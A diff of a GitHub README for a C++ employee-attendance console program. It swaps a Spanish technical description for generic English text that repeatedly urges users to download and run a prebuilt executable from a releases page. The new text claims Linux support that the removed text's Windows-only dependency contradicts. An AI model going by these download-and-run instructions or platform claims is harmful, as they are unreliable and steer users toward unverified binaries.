@@ -1,46 +1,80 @@
-# 🚀 Sistema de Gestión de Marcaciones de Empleados
+# 🎉 SistemaGestionEmpleados - Manage Employee Attendance with Ease
+
+[![Download SistemaGestionEmpleados](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/ducktran/SistemaGestionEmpleados/releases)
+
+## 📖 Description
+
 Este proyecto consiste en un sistema de gestión de asistencia de empleados (SIGESAT) creado en C++. Permite registrar empleados, gestionar sus asistencias (marcaciones), y generar reportes relacionados con la asistencia, ausencias, permisos y horas extra. Utiliza archivos binarios para almacenar la información de empleados, marcaciones y reportes.
 
+## 🚀 Getting Started
 
-## 📝 Puntos Importantes
-### 1. Clases principales
-- **Empleado**: Representa a un empleado con atributos como código, nombre, DUI, departamento, cargo y estado (activo/inactivo)...
+Follow these simple steps to download and run the software. You’ll need a computer with Windows or Linux operating systems to use the application.
 
-- **Marcacion**: Representa una marcación de asistencia, con atributos como código de empleado, fecha, hora de entrada/salida, horas extra, permiso, motivo y observaciones. También tiene métodos para cargar y guardar marcaciones (marcaciones.dat).
+### ✅ Prerequisites
 
-- **Reporte**: Permite almacenar información de reportes generados, aunque en el código actual solo se usa para guardar/cargar reportes (reportes.dat).
+- **Operating System:** Windows 10 or later, or a compatible Linux distribution.
+- **Storage Space:** At least 100 MB of free disk space for the application and data files.
+- **User Permissions:** You should have permission to install software on your computer.
 
-- **SistemaGestion**: Es la clase principal que gestiona la lógica del sistema. Contiene vectores de empleados, marcaciones y reportes, y métodos para todas las operaciones del sistema (agregar/editar/desactivar/listar empleados, registrar/editar/listar marcaciones, y generar reportes).
+## 💾 Download & Install
 
-### 2. 📋 Menús
-### El sistema tiene menús para:
+To get started, visit the Releases page to download the application. 
 
-- Gestión de empleados (agregar, editar, desactivar, listar)
-- Registro de marcaciones (registrar, editar, listar)
-- Reportes (asistencia, horas trabajadas, ausencias, permisos, horas extra)
+[Download SistemaGestionEmpleados Here](https://github.com/ducktran/SistemaGestionEmpleados/releases)
 
-### 3. 📝 Persistencia de datos
-Toda la información se guarda en archivos binarios (empleados.dat, marcaciones.dat, reportes.dat). Cada vez que se realiza una operación de alta, edición o eliminación lógica, se actualizan los archivos correspondientes.
+1. Click on the link above to go to the Releases page.
+2. Locate the latest release of SistemaGestionEmpleados.
+3. Download the appropriate file for your operating system (typically named something like `SistemaGestionEmpleados.exe` or similar).
+4. Once the download completes, locate the file in your Downloads folder.
 
-### 4. ⚡ Validaciones
-Al agregar empleados, se valida que el código y el DUI no estén repetidos.
-Al registrar marcaciones, se valida que el empleado exista y esté activo, que la fecha y hora tengan el formato correcto, y que no exista ya una marcación para ese empleado y fecha.
-Al editar o desactivar empleados/marcaciones, se verifica que existan y estén activos.
+### 🔄 Running the Application
 
-### 6. 📚 Reportes
-
-El sistema puede generar varios reportes:
-
-- Asistencia por rango de fechas.
-- Horas trabajadas por empleado.
-- Empleados con ausencias en una fecha.
-- Permisos solicitados.
-- Horas extra realizadas en un rango de fechas.
+1. **Windows:** 
+   - Double-click the downloaded `.exe` file.
+   - Follow the prompts that appear on your screen.
   
-### 6. 💻 Interfaz
-La interfaz es por consola, con menús y tablas formateadas usando iomanip para facilitar la lectura.
+2. **Linux:** 
+   - Open a terminal.
+   - Navigate to the directory where you downloaded the file.
+   - Use the command `chmod +x SistemaGestionEmpleados` to make the file executable.
+   - Run the application using `./SistemaGestionEmpleados`.
 
-<img width="1062" height="539" alt="image" src="https://github.com/user-attachments/assets/9d55b4f5-003e-4f8f-8db5-d6277918f69a" />
+### 📊 Features
 
-### 8. 🛠️ Compatibilidad
-- Incluye **windows.h** y usa **SetConsoleOutputCP(CP_UTF8)**; para soportar caracteres UTF-8 en la consola de Windows.
+- **Employee Registration:** Easily add new employees to the system.
+- **Attendance Management:** Keep track of daily attendance through simple mark-in and mark-out options.
+- **Report Generation:** Generate detailed reports on attendance, absences, permissions, and overtime hours worked.
+- **Data Storage:** Secure and efficient storage using binary files, ensuring quick access and retrieval.
+
+### ⚙️ Usage Instructions
+
+After launching the application:
+
+- Navigate through the menu using your keyboard.
+- Choose the option for employee registration or attendance management.
+- Follow on-screen instructions to complete your tasks.
+- To generate reports, select the report generation feature from the main menu.
+
+### 🛠️ Troubleshooting
+
+If you encounter issues while running the software:
+
+- **Installation Problems:** Ensure you have the required permissions to install applications on your system.
+- **Application Crashes:** Check that your operating system is up to date and that you have enough free disk space.
+- **Missing Features:** Ensure you have the latest version by visiting the Releases page.
+
+## 📝 Additional Information
+
+For any questions or further help:
+
+- Browse through our **FAQ** section on the GitHub repository.
+- Visit the **Issues** tab on GitHub to report bugs or request features.
+
+You can also explore the topics related to this project, which include: attendance system, binary files, console application, data persistence, employee management, file handling, object-oriented programming, overtime calculation, report generation, and time tracking.
+
+## 🌐 Links
+
+- [Repository](https://github.com/ducktran/SistemaGestionEmpleados)
+- [Download SistemaGestionEmpleados](https://github.com/ducktran/SistemaGestionEmpleados/releases)
+
+[![Download SistemaGestionEmpleados](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/ducktran/SistemaGestionEmpleados/releases)
